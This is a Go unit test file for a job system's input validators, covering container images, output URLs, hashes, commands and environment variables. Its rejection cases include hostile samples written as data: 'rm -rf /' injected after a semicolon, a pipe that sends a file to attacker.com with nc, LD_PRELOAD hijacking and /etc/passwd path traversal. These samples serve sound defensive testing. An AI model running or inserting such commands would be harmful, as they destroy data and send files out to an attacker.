package types

import (
	"strings"
	"testing"
)

func TestValidateContainerImage(t *testing.T) {
	tests := []struct {
		name    string
		image   string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid docker.io image",
			image:   "docker.io/library/ubuntu:latest",
			wantErr: false,
		},
		{
			name:    "valid gcr.io image",
			image:   "gcr.io/project/image:v1.0.0",
			wantErr: false,
		},
		{
			name:    "valid ghcr.io image",
			image:   "ghcr.io/user/repo:tag",
			wantErr: false,
		},
		{
			name:    "valid quay.io image",
			image:   "quay.io/namespace/image:latest",
			wantErr: false,
		},
		{
			name:    "valid image with default registry",
			image:   "ubuntu:latest",
			wantErr: false,
		},
		{
			name:    "empty image",
			image:   "",
			wantErr: true,
			errMsg:  "container image cannot be empty",
		},
		{
			name:    "image too long",
			image:   strings.Repeat("a", MaxContainerImageLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "unauthorized registry",
			image:   "evil.registry.com/malware:latest",
			wantErr: true,
			errMsg:  "not in the allowed whitelist",
		},
		{
			name:    "image with path traversal",
			image:   "docker.io/../../etc/passwd",
			wantErr: true,
			errMsg:  "invalid container image format",
		},
		{
			name:    "image with double slash",
			image:   "docker.io//library/ubuntu",
			wantErr: true,
			errMsg:  "invalid container image format",
		},
		{
			name:    "image with backslash",
			image:   "docker.io\\library\\ubuntu",
			wantErr: true,
			errMsg:  "invalid container image format",
		},
		{
			name:    "image with space",
			image:   "docker.io/library ubuntu:latest",
			wantErr: true,
			errMsg:  "invalid container image format",
		},
		{
			name:    "invalid format",
			image:   "DOCKER.IO/LIBRARY/UBUNTU:LATEST",
			wantErr: true,
			errMsg:  "invalid container image format",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateContainerImage(tt.image)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateContainerImage() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateContainerImage() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateOutputURL(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid https URL",
			url:     "https://storage.example.com/results/123",
			wantErr: false,
		},
		{
			name:    "valid ipfs URL",
			url:     "ipfs://QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG",
			wantErr: false,
		},
		{
			name:    "valid arweave URL",
			url:     "ar://abc123def456",
			wantErr: false,
		},
		{
			name:    "empty URL",
			url:     "",
			wantErr: true,
			errMsg:  "output URL cannot be empty",
		},
		{
			name:    "URL too long",
			url:     "https://example.com/" + strings.Repeat("a", MaxOutputURLLength),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "invalid URL format",
			url:     "not a url",
			wantErr: true,
			errMsg:  "URL scheme",
		},
		{
			name:    "disallowed http scheme",
			url:     "http://example.com/data",
			wantErr: true,
			errMsg:  "URL scheme http is not allowed",
		},
		{
			name:    "disallowed ftp scheme",
			url:     "ftp://example.com/data",
			wantErr: true,
			errMsg:  "URL scheme ftp is not allowed",
		},
		{
			name:    "https with localhost",
			url:     "https://localhost/data",
			wantErr: true,
			errMsg:  "URL host localhost is blocked",
		},
		{
			name:    "https with 127.0.0.1",
			url:     "https://127.0.0.1/data",
			wantErr: true,
			errMsg:  "URL host 127.0.0.1 is blocked",
		},
		{
			name:    "https with private IP 10.x.x.x",
			url:     "https://10.1.1.1/data",
			wantErr: true,
			errMsg:  "private or reserved IP addresses are not allowed",
		},
		{
			name:    "https with private IP 192.168.x.x",
			url:     "https://192.168.1.1/data",
			wantErr: true,
			errMsg:  "private or reserved IP addresses are not allowed",
		},
		{
			name:    "https with private IP 172.16.x.x",
			url:     "https://172.16.1.1/data",
			wantErr: true,
			errMsg:  "private or reserved IP addresses are not allowed",
		},
		{
			name:    "https without host",
			url:     "https:///path",
			wantErr: true,
			errMsg:  "HTTPS URL must have a valid host",
		},
		{
			name:    "URL with path traversal",
			url:     "https://example.com/../../../etc/passwd",
			wantErr: true,
			errMsg:  "URL contains path traversal pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateOutputURL(tt.url)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateOutputURL() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateOutputURL() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateOutputHash(t *testing.T) {
	tests := []struct {
		name    string
		hash    string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid SHA-256 hash",
			hash:    "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
			wantErr: false,
		},
		{
			name:    "valid hash all zeros",
			hash:    strings.Repeat("0", 64),
			wantErr: false,
		},
		{
			name:    "valid hash all f's",
			hash:    strings.Repeat("f", 64),
			wantErr: false,
		},
		{
			name:    "empty hash",
			hash:    "",
			wantErr: true,
			errMsg:  "output hash cannot be empty",
		},
		{
			name:    "hash too long",
			hash:    strings.Repeat("a", MaxOutputHashLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "hash too short",
			hash:    strings.Repeat("a", 63),
			wantErr: true,
			errMsg:  "invalid hash format",
		},
		{
			name:    "hash with uppercase",
			hash:    strings.ToUpper("a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"),
			wantErr: true,
			errMsg:  "invalid hash format",
		},
		{
			name:    "hash with invalid characters",
			hash:    "g665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
			wantErr: true,
			errMsg:  "invalid hash format",
		},
		{
			name:    "hash with spaces",
			hash:    "a665a459 20422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
			wantErr: true,
			errMsg:  "invalid hash format",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateOutputHash(tt.hash)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateOutputHash() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateOutputHash() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateMoniker(t *testing.T) {
	tests := []struct {
		name    string
		moniker string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid moniker",
			moniker: "my-provider-node",
			wantErr: false,
		},
		{
			name:    "valid moniker with unicode",
			moniker: "Provider-节点-1",
			wantErr: false,
		},
		{
			name:    "empty moniker",
			moniker: "",
			wantErr: true,
			errMsg:  "moniker cannot be empty",
		},
		{
			name:    "moniker too long",
			moniker: strings.Repeat("a", MaxMonikerLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "moniker with control character (tab)",
			moniker: "provider\tnode",
			wantErr: true,
			errMsg:  "invalid control characters",
		},
		{
			name:    "moniker with control character (newline)",
			moniker: "provider\nnode",
			wantErr: true,
			errMsg:  "invalid control characters",
		},
		{
			name:    "moniker with DEL character",
			moniker: "provider\x7fnode",
			wantErr: true,
			errMsg:  "invalid control characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateMoniker(tt.moniker)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateMoniker() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateMoniker() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateEndpoint(t *testing.T) {
	tests := []struct {
		name     string
		endpoint string
		wantErr  bool
		errMsg   string
	}{
		{
			name:     "valid https endpoint",
			endpoint: "https://provider.example.com:8080",
			wantErr:  false,
		},
		{
			name:     "valid http localhost endpoint",
			endpoint: "http://localhost:8080",
			wantErr:  false,
		},
		{
			name:     "empty endpoint",
			endpoint: "",
			wantErr:  true,
			errMsg:   "endpoint cannot be empty",
		},
		{
			name:     "endpoint too long",
			endpoint: "https://" + strings.Repeat("a", MaxEndpointLength),
			wantErr:  true,
			errMsg:   "exceeds maximum length",
		},
		{
			name:     "invalid URL format",
			endpoint: "not a url",
			wantErr:  true,
			errMsg:   "endpoint must use HTTPS scheme",
		},
		{
			name:     "endpoint with ftp scheme",
			endpoint: "ftp://provider.example.com",
			wantErr:  true,
			errMsg:   "endpoint must use HTTPS scheme",
		},
		{
			name:     "endpoint without host",
			endpoint: "https:///path",
			wantErr:  true,
			errMsg:   "endpoint must have a valid host",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateEndpoint(tt.endpoint)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateEndpoint() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateEndpoint() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name    string
		command []string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid command",
			command: []string{"python", "script.py"},
			wantErr: false,
		},
		{
			name:    "valid command with args",
			command: []string{"python", "-m", "module", "--arg=value"},
			wantErr: false,
		},
		{
			name:    "empty command",
			command: []string{},
			wantErr: false,
		},
		{
			name:    "too many arguments",
			command: make([]string, MaxCommandArgsCount+1),
			wantErr: true,
			errMsg:  "too many arguments",
		},
		{
			name:    "argument with null byte",
			command: []string{"python", "script.py\x00malicious"},
			wantErr: true,
			errMsg:  "contains null byte",
		},
		{
			name:    "argument with semicolon",
			command: []string{"python", "script.py;rm -rf /"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "argument with pipe",
			command: []string{"cat file.txt | nc attacker.com 1234"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "argument with ampersand",
			command: []string{"sleep 10 & malicious_command"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "argument with backtick",
			command: []string{"echo `whoami`"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "argument with dollar sign",
			command: []string{"echo $HOME"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "argument with redirect",
			command: []string{"cat file.txt > output.txt"},
			wantErr: true,
			errMsg:  "potentially dangerous character",
		},
		{
			name:    "total length too long",
			command: []string{strings.Repeat("a", MaxCommandLength/2), strings.Repeat("b", MaxCommandLength/2+1)},
			wantErr: true,
			errMsg:  "total command length exceeds maximum",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateCommand() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestValidateEnvVars(t *testing.T) {
	tests := []struct {
		name    string
		envVars map[string]string
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid environment variables",
			envVars: map[string]string{
				"ENV":   "production",
				"DEBUG": "false",
			},
			wantErr: false,
		},
		{
			name:    "empty env vars",
			envVars: map[string]string{},
			wantErr: false,
		},
		{
			name: "too many env vars",
			envVars: func() map[string]string {
				m := make(map[string]string)
				for i := 0; i < MaxEnvVarsCount+1; i++ {
					key := string(rune('A'+(i%26))) + strings.ToUpper(strings.Repeat("X", i/26))
					m[key] = "value"
				}
				return m
			}(),
			wantErr: true,
			errMsg:  "too many environment variables",
		},
		{
			name: "env var key too long",
			envVars: map[string]string{
				strings.Repeat("A", MaxEnvVarKeyLength+1): "value",
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name: "env var value too long",
			envVars: map[string]string{
				"KEY": strings.Repeat("a", MaxEnvVarValueLength+1),
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name: "invalid env var key format - lowercase",
			envVars: map[string]string{
				"lowercase": "value",
			},
			wantErr: true,
			errMsg:  "invalid environment variable key",
		},
		{
			name: "invalid env var key format - starts with digit",
			envVars: map[string]string{
				"1INVALID": "value",
			},
			wantErr: true,
			errMsg:  "invalid environment variable key",
		},
		{
			name: "invalid env var key format - contains dash",
			envVars: map[string]string{
				"INVALID-KEY": "value",
			},
			wantErr: true,
			errMsg:  "invalid environment variable key",
		},
		{
			name: "env var value with null byte",
			envVars: map[string]string{
				"KEY": "value\x00malicious",
			},
			wantErr: true,
			errMsg:  "contains null byte",
		},
		{
			name: "blocked env var LD_PRELOAD",
			envVars: map[string]string{
				"LD_PRELOAD": "/tmp/malicious.so",
			},
			wantErr: true,
			errMsg:  "is not allowed",
		},
		{
			name: "blocked env var LD_LIBRARY_PATH",
			envVars: map[string]string{
				"LD_LIBRARY_PATH": "/tmp/malicious",
			},
			wantErr: true,
			errMsg:  "is not allowed",
		},
		{
			name: "blocked env var PATH",
			envVars: map[string]string{
				"PATH": "/tmp/malicious:/usr/bin",
			},
			wantErr: true,
			errMsg:  "is not allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateEnvVars(tt.envVars)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateEnvVars() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if tt.wantErr && err != nil && tt.errMsg != "" {
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateEnvVars() error = %v, want error containing %v", err, tt.errMsg)
				}
			}
		})
	}
}

func TestSanitizeString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "normal string",
			input: "hello world",
			want:  "hello world",
		},
		{
			name:  "string with leading/trailing whitespace",
			input: "  hello world  ",
			want:  "hello world",
		},
		{
			name:  "string with tab",
			input: "hello\tworld",
			want:  "helloworld",
		},
		{
			name:  "string with newline",
			input: "hello\nworld",
			want:  "helloworld",
		},
		{
			name:  "string with carriage return",
			input: "hello\rworld",
			want:  "helloworld",
		},
		{
			name:  "string with DEL character",
			input: "hello\x7fworld",
			want:  "helloworld",
		},
		{
			name:  "string with multiple control characters",
			input: "\x01\x02hello\x03world\x04\x05",
			want:  "helloworld",
		},
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "only whitespace",
			input: "   \t\n\r   ",
			want:  "",
		},
		{
			name:  "unicode preserved",
			input: "hello 世界",
			want:  "hello 世界",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeString(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeString() = %q, want %q", got, tt.want)
			}
		})
	}
}

func BenchmarkValidateContainerImage(b *testing.B) {
	image := "docker.io/library/ubuntu:latest"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ValidateContainerImage(image)
	}
}

func BenchmarkValidateOutputURL(b *testing.B) {
	url := "https://storage.example.com/results/123456789"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ValidateOutputURL(url)
	}
}

func BenchmarkValidateOutputHash(b *testing.B) {
	hash := "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ValidateOutputHash(hash)
	}
}

func BenchmarkValidateEnvVars(b *testing.B) {
	envVars := map[string]string{
		"ENV":       "production",
		"DEBUG":     "false",
		"LOG_LEVEL": "info",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ValidateEnvVars(envVars)
	}
}

func BenchmarkSanitizeString(b *testing.B) {
	input := "  hello\tworld\ntest\r  "
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeString(input)
	}
}
